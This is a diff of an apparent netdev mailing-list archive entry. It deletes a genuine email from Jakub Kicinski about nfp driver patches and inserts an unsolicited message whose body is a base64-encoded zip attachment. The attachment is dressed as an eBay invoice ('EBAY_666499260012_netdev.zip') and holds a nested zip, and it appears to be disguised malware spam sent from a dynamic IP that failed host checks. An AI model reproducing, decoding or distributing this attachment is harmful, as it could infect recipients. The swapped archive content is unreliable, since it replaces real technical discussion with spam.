@@ -1,59 +1,60 @@
-From: Jakub Kicinski <jakub.kicinski@netronome.com>
-Subject: Re: [PATCH net 0/3] nfp: port enumeration change and FW ABI
- adjustment
-Date: Tue, 4 Jul 2017 13:52:07 -0700
-Message-ID: <20170704135207.51adade5@cakuba.netronome.com>
-References: <20170704092721.780-1-jakub.kicinski@netronome.com>
-        <20170704.032949.30168457068908035.davem@davemloft.net>
+From: <salome.khum@vision-france.net>
+Subject: (unknown)
+Date: Tue, 04 Jul 2017 21:02:41 -0000
+Message-ID: <149920216176.29695.2237520837382274623@mts-nn.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7bit
-Cc: netdev@vger.kernel.org, oss-drivers@netronome.com
-To: David Miller <davem@davemloft.net>
+Content-Type: application/zip; name="EBAY_666499260012_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pg0-f43.google.com ([74.125.83.43]:35471 "EHLO
-        mail-pg0-f43.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752169AbdGDUwL (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Tue, 4 Jul 2017 16:52:11 -0400
-Received: by mail-pg0-f43.google.com with SMTP id j186so114172829pge.2
-        for <netdev@vger.kernel.org>; Tue, 04 Jul 2017 13:52:11 -0700 (PDT)
-In-Reply-To: <20170704.032949.30168457068908035.davem@davemloft.net>
+Received: from 109-184-7-156.dynamic.mts-nn.ru ([109.184.7.156]:47654 "HELO
+        mts-nn.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752169AbdGDVCq (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Tue, 4 Jul 2017 17:02:46 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Tue, 04 Jul 2017 03:29:49 -0700 (PDT), David Miller wrote:
-> From: Jakub Kicinski <jakub.kicinski@netronome.com>
-> Date: Tue,  4 Jul 2017 02:27:18 -0700
-> 
-> > This set changes the way ports are numbered internally to avoid MAC address
-> > changes and invalid link information when breakout is configured.  Second
-> > patch gets rid of old way of looking up MAC addresses in device information
-> > which caused all this confusion.
-> > 
-> > Patch 3 is a small adjustment to the new FW ABI version we introduced in
-> > this release cycle.
-> > 
-> > 
-> > To clarify these are intended for 4.13, naturally.  
-> 
-> net-next is closed, and it looks like these are not really bug fixes
-> but a behavior adjustment and therefore more like a new feature.
-
-Ah, silly me, I had these ready on Friday but didn't want to participate
-in the just-before-the-merge-window rush :(
-
-Could you be pursued to take patch 3?  Without it our current Flower
-firmware does not work with the 5.x ABI, if we get a kernel released in
-this state we will have to bump the ABI again, effectively making the
-4.13 Flower offload unusable :(
-
-Patch 1 fixes ethtool dumping and configuring wrong ports.  I had a
-report from someone using a 2x40 card where one port was broken out to
-4x10 and ethtool was swapping info on the 40G port and one of the 10G
-ports.  I didn't notice this in testing, because I was testing with two
-NFPs back to back, so the port swap sort of cancelled itself out.  I
-should've made it clearer in the commit message that the patch
-effectively fixes the association between management FW idea of ports
-and the netdevs.  This is lower priority than patch 3, though.
-
-Patch 2 can be dropped, I tossed it in unnecessarily.
+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
+AAEAAQBgAAAAuggAAAAA
